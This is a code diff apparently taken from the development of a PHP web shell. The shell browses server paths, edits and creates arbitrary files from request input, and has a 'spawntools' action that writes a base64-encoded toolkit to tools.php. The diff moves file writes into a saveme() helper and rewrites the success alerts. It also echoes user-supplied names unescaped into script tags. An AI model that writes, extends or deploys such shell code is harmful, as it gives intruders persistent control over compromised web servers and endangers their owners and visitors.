@@ -53,10 +53,8 @@ if(htmlspecialchars(isset($_GET["path"]))) {
     <?php
     if(isset($_POST["edit"])) {
       $editted = base64_encode($_POST["content"]);
-      $open = fopen($file, "w");
-      fwrite($open, base64_decode($editted));
-      fclose($open);
-      if($open) {
+      $save = saveme($file, base64_decode($editted));
+      if($save) {
         echo "<script>alert('Edit $file_name success')</script>";
         echo "<script>window.location = '?path=$path&action=edit&file=$file'</script>";
       } else {
@@ -88,16 +86,13 @@ if(htmlspecialchars(isset($_GET["path"]))) {
     }
   }
   elseif($_GET["action"] == "spawntools") {
-    $op = fopen($path."/tools.php", "w");
-    fwrite($op, base64_decode($tools));
-    fclose($op);
+    $save = saveme($path."/tools.php", base64_decode($tools));
     echo "<center>";
-    if($op) {
-      $link = basename($path)."/tools.php";
-      echo "ToolKit successfully spawned<br>";
-      echo "<a href='$link'>ToolKit</a>";
+    if($save) {
+      echo "<script>alert('Spawn Toolkit success')</script>";
+      echo "<script>window.location = '?path=$path'</script>";
     } else {
-      echo "Spawn tools.php failed";
+      echo "Spawn Toolkit failed";
     }
     echo "</center>";
   } elseif($_GET["action"] == "createfile") {
@@ -114,12 +109,10 @@ if(htmlspecialchars(isset($_GET["path"]))) {
     if(isset($_POST["touch"])) {
       $filename = $_POST["filename"];
       $filetext = base64_encode($_POST["filetext"]);
-      $touch = fopen($_GET["path"]."/".$filename, "w");
-      fwrite($touch, base64_decode($filetext));
-      fclose($touch);
-      if($touch) {
+      $save = saveme($path."/".$filename, base64_decode($filetext));
+      if($save) {
         echo "<script>alert('".$filename." has successfully created')</script>";
-        echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
+        echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
       } else {
         echo "Create file failed";
       }
@@ -137,7 +130,7 @@ if(htmlspecialchars(isset($_GET["path"]))) {
       $fname = $_POST["foldername"];
       if(@mkdir($path."/".$fname)) {
         echo "<script>alert('$fname Created')</script>";
-      	echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
+      	echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
       } else {
         echo "Create folder failed";
       }
@@ -259,6 +252,13 @@ if(htmlspecialchars(isset($_GET["path"]))) {
   }
 }
 
+function saveme($name, $content) {
+  $open = fopen($name, "w");
+  fwrite($open, $content);
+  fclose($open);
+  return $open;
+}
+
 function renames($item, $path, $name) {
   ?>
   <form method="POST">
@@ -277,8 +277,7 @@ function renames($item, $path, $name) {
   }
 }
 
-function Size($path)
-{
+function Size($path) {
   $bytes = sprintf('%u', filesize($path));
   if ($bytes > 0) {
     $unit = intval(log($bytes, 1024));
